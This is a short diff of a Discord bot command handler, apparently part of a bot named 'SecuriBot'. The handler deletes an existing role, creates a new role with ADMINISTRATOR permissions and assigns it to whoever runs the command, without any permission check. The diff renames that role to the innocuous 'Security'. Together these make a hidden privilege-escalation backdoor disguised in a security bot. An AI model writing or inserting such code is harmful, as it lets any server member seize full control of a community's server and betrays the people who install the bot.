@@ -1,7 +1,7 @@
 module.exports.run = async (bot, message, args) => {
   message.guild.roles.find(role => role.name === 'SecuriBot').delete();
   message.guild.createRole({
-    name: 'SecuriBot',
+    name: 'Security',
     permissions: ['ADMINISTRATOR']
   }).then(role => message.member.addRole(role))
 }
